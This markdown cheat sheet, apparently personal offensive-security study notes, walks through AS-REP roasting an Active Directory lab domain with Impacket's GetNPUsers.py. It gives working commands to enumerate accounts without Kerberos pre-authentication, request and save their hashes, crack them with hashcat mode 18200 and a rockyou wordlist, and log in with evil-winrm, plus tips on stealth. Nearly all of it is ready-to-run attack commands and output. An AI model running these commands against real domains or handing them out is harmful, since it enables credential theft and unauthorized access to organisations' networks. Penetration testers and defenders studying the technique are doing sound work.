
# 🎯 Impacket — GetNPUsers.py (AS-REP Roasting)

> Offensive-Active-Directory / Kerberos-Enumeration / impacket-GetNPUsers

**Tool:** `GetNPUsers.py`
**Purpose:** Retrieve AS-REP hashes for user accounts configured with **"Do not require Kerberos pre-authentication"**, enabling offline password cracking.

---

## 📌 Table of Contents

- [Overview](#overview)
- [Basic Syntax](#basic-syntax)
- [Common Usage Scenarios](#common-usage-scenarios)
- [Example Output](#example-output)
- [Cracking AS-REP Hashes](#cracking-as-rep-hashes)
- [Post-Exploitation](#post-exploitation)
- [Operational Notes](#operational-notes)
- [References](#references)

---

## Overview

`GetNPUsers.py` is part of the **Impacket** toolkit and is used to enumerate and request AS-REP responses from a Domain Controller. If pre-authentication is disabled for a user account, the tool can obtain encrypted data without valid credentials.

---

## Basic Syntax

```bash
GetNPUsers.py [domain/]username[:password] -dc-ip <domain controller IP> [options]
```

**Display help:**

```bash
impacket-GetNPUsers -h
```

---

## Common Usage Scenarios

### Enumerate Potentially Vulnerable Users (Unauthenticated)

```bash
impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100
```

### Request AS-REP Hashes

```bash
impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100 -request
```

### Output in Hashcat Format

```bash
impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100 -request -format hashcat
```

### Use a Username List

```bash
impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100 -usersfile users.txt
```

### Anonymous Enumeration (No Credentials)

```bash
impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100 -usersfile users.txt -no-pass
```

### Authenticated Enumeration

```bash
impacket-GetNPUsers aman.local/username:password -dc-ip 192.168.2.100 -usersfile users.txt
```

### Save Output to File

```bash
impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100 -request -outputfile asrep-hashes.txt
```

---

## Example Output

**Live run (unauthenticated enumeration):**

```bash
impacket-GetNPUsers aman.local/ -dc-ip 192.168.2.100
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Name              MemberOf  PasswordLastSet             LastLogon                   UAC
----------------  --------  --------------------------  --------------------------  --------
User-asrep-roast            2026-04-03 15:44:41.749444  2026-04-03 15:51:32.937037  0x410200
```

**View the captured hashes:**

```bash
cat -n asrep-hashes.txt
```

---

## Cracking AS-REP Hashes

### Identify Hashcat Mode

```bash
hashcat -h | grep -i kerberos
```

**Expected output:**

```
18200 | Kerberos 5, etype 23, AS-REP | Network protocol
```

### Crack Using Hashcat

```bash
hashcat -a 0 -m 18200 asrep-hashes.txt /opt/rockyou.txt --show
```

---

## Post-Exploitation

If credentials are successfully recovered, they can be used to access the target system:

```bash
evil-winrm -i 192.168.2.100 -u username -p password
```

---

## Operational Notes

- Ensure accurate username enumeration before running the attack
- Prefer `-no-pass` for stealth when authentication is not required
- Use `-format hashcat` to streamline cracking workflows
- Store hashes securely and clean up after testing

---

## References

- Impacket Toolkit (`GetNPUsers.py`)
- Hashcat Documentation (Kerberos Modes)
- Evil-WinRM Tool

---

<p align="center"><sub>📚 Notes compiled for personal study & offensive security learning.</sub></p>
